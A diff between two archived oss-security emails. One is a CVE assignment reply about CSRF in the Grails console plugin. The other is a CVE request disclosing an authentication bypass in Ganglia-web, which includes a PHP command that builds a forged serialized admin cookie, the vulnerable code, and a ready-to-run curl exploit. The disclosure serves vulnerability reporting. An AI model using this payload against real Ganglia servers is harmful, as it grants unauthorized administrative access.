@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2889" "Tuesday" "2" "August" "2016" "18:43:16" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160802224316.0A523B2E007@smtpvbsrv1.mitre.org>" "67" "[oss-security] Re: CVE Request: CSRF in Grails console" nil nil nil "8" "2016080222:43:16" "[oss-security] Re: CVE Request: CSRF in Grails console" (number mark "U       cve-assign@m Aug  2   67/2889  " thread-indent "\"[oss-security] Re: CVE Request: CSRF in Grails console\"\n") "<CAFdyfB2D-63JUZbO_tU8sx2_pbS1e30cBemu81PNKABufdogpg@mail.gmail.com>" ("<CAFdyfB2D-63JUZbO_tU8sx2_pbS1e30cBemu81PNKABufdogpg@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["965" "Friday" "4" "September" "2015" "20:34:39" "+0300" "Ivan Novikov" "in@wallarm.com" "<55E9D62F.5030603@wallarm.com>" "26" "[oss-security] CVE request: Ganglia-web auth bypass" nil nil nil "9" "2015090417:34:39" "[oss-security] CVE request: Ganglia-web auth bypass" (number mark "        in@wallarm.c Sep  4   26/965   " thread-indent "\"[oss-security] CVE request: Ganglia-web auth bypass\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 6016 invoked by uid 550); 2 Aug 2016 22:43:28 -0000
+Received: (qmail 14229 invoked by uid 550); 4 Sep 2015 17:40:51 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,80 +11,44 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 11600 invoked from network); 4 Sep 2015 17:34:51 -0000
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=wallarm.com; s=default;
+	h=Content-Transfer-Encoding:Content-Type:Subject:To:MIME-Version:From:Date:Message-ID; bh=0iCK54vg3S++1EAfTKHepmmzuNzAcFo3OC60Xq4q1xw=;
+	b=BmDUHDsWPFhM6VdcTJ47tiNIcg/IO4zIOyv+8ztHaI41pxX3urPv9aL2JY7Ri5+teAWKuoRBo1YSuttpI94ahJkFp+xVQYlUe6bwDJ2kRK4hwpa7LACKXZtmxuMt18xAbqmwYBfkkuulfyZc54UHPzH7KVoXyK43AnxkeedUNNgHyejdvx4IiGabkFmVkG5nhQJofrNLVmvCqb1vIDK5hnYqfA8FN7U4fW7e38OFdr5/6uRdgSultz9i9xIL1NBdd8mqxJTC9H6IxXhjk2mCRNUqNqelmUeO68X9IXShDIDudcbuTqOgrut5mf9spWOA7JUKXrHR2ZfBoBrLrLGw2A==;
+Message-ID: <55E9D62F.5030603@wallarm.com>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:31.0) Gecko/20100101 Thunderbird/31.7.0
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 7bit
+Date: Fri, 04 Sep 2015 20:34:39 +0300
+From: Ivan Novikov <in@wallarm.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 5993 invoked from network); 2 Aug 2016 22:43:28 -0000
-From: cve-assign@mitre.org
-To: berdario@gmail.com
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
-In-Reply-To: <CAFdyfB2D-63JUZbO_tU8sx2_pbS1e30cBemu81PNKABufdogpg@mail.gmail.com>
-Message-Id: <20160802224316.0A523B2E007@smtpvbsrv1.mitre.org>
-Date: Tue,  2 Aug 2016 18:43:16 -0400 (EDT)
-Subject: [oss-security] Re: CVE Request: CSRF in Grails console
+Subject: [oss-security] CVE request: Ganglia-web auth bypass
+To: oss-security@lists.openwall.com
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Reported by GitHub:
+https://github.com/ganglia/ganglia-web/issues/267
 
-> The Grails console (aka Grails Debug Console, Grails Web Console) was
-> vulnerable to CSRF.
-> 
-> https://grails.org/plugin/console
-> https://github.com/sheehan/grails-console
-> 
-> (this is the plugin, not to be confused with the command line grails
-> console: http://docs.grails.org/3.1.1/ref/Command%20Line/console.html
-> )
-> 
-> The fix has been made available in versions 1.5.10, 2.0.7. Versions up
-> to 1.5.9 and 2.0.6 are affected.
-> 
-> This allows an attacker to (create pages that when visited by a victim
-> will) forge requests that will execute arbitrary groovy code on the
-> backend (the documentation explains how to enable it in production,
-> and granting access to administrators only, so this is not simply a
-> development tool).
-> 
-> Bug tracker: https://github.com/sheehan/grails-console/issues/54
-> fix commit: https://github.com/sheehan/grails-console/commit/155e0f5f0fe3b3bd7027d730fa00bf0655f28207
+It's easy to bypass auth by using boolean serialization like this:
+$ php -r "echo urlencode(serialize(array('user'=>'admin',
+'group'=>'admin', 'token'=>true)));"
 
-Use CVE-2016-6521.
+Vulnerable code listed below:
+https://github.com/ganglia/ganglia-web/blob/4e98ea69e0e18b388cdc73809ce54843a16ff87b/lib/GangliaAuth.php#L34-L46
 
-(Conceivably this could have had a CVE-2015 number if
-https://github.com/sheehan/grails-console/issues/24 were interpreted as
-a vulnerability disclosure; however issues/24 seems too vague.)
+if(isSet($_COOKIE['ganglia_auth'])) {
+  $cookie = $_COOKIE['ganglia_auth'];
+  // magic quotes will break unserialization
+  if($this->getMagicQuotesGpc()) {
+    $cookie = stripslashes($cookie);
+  }
+  $data = unserialize($cookie);
+  if(array_keys($data) != array('user','group','token')) {
+    return false;
+  }
+  if($this->getAuthToken($data['user']) == $data['token']) {
 
-
-> Unfortunately the Grails framework itself ships with some horribly
-> insecure defaults. As of 3.1.9 the template code dropped by `grails
-> create-app` will have a UrlMappings.groovy that will allow access to
-> Grails controllers actions via any HTTP method.
-
-It is possible that a behavior like this could have its own CVE ID if
-it is undocumented or interacts incorrectly with run-app. For example,
-http://docs.grails.org/1.3.9/guide/single.html#6.4.5%20Mapping%20to%20HTTP%20methods
-says "the HTTP method (GET, POST, PUT or DELETE)." Do you mean, for
-example, that the OPTIONS or TRACE method can allow access, but the
-documentation suggests that only GET, POST, PUT, and DELETE need to be
-anticipated?
-
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBCAAGBQJXoSGRAAoJEHb/MwWLVhi2gEIP/iwnGiItegQOEYvx1qpyJvGP
-+dTJ3xgvB0Zc8L5e4VD6AUd2d687GKeLB4juOYWR9h7TGyu62X6KMfAVfSl/4D5n
-3N+DoZHuPIw6GlW9apWA9HeHg/PqUxV7in41wDRXkn1m1eD2Jz5zxm+ZaBrKmoOy
-DNFnjSSaUkNuQtPq2qstIGxZ+iLBlBSH0k4kR5MTIUEoZZ3E2DZrP+0x5v+8MaZn
-GCDfhJ0WWxUMr0d8lbpntZGWJU0hbacg2ImKDFSwhNkRR8r5CMzEK62p0ZqiEWNU
-0udvX42XXM4YUXg54fXpN8lkt6qd8QIpa0FXlFLN/Oa2auI2pU+RnQ607yc8KGzN
-1tiWXGQtxiWRQcZ8V93K5Ytj99qbpfyPRQpLtEX1GCilu/Bog2HCv9mFWmgTqib0
-3/80z6599TFmeSibxIz21qkGPtXjwxjEhwdaDuUNP3Cc6xQK9pS9Vq/GmoGCNR46
-ov/CpWbWEK058n6or0u7gl6rsJJNh55XKrXjfujrY+Dly3FQ0pULXPWnbsnFS4Vj
-J+nNiQnX2wuYOmf+RoRn1H7rxFj5+9+pkrQFNbZZFKUpmXchyI6TTPaq5Cfpm9X8
-oyyEV4ykiaOpH7CgHavqbhgfV3FkDBCPWb0iN2tgpK1rNEl84b18afRlVq+zVNBN
-INdR8i7XC8AJf0piGF8J
-=yHDR
------END PGP SIGNATURE-----
+// Found by d90.andrew
+// Exploit: curl -H 'Cookie:
+a%3A3%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22group%22%3Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22token%22%3Bb%3A1%3B%7D'
+http://ganglia.local/ganglia/
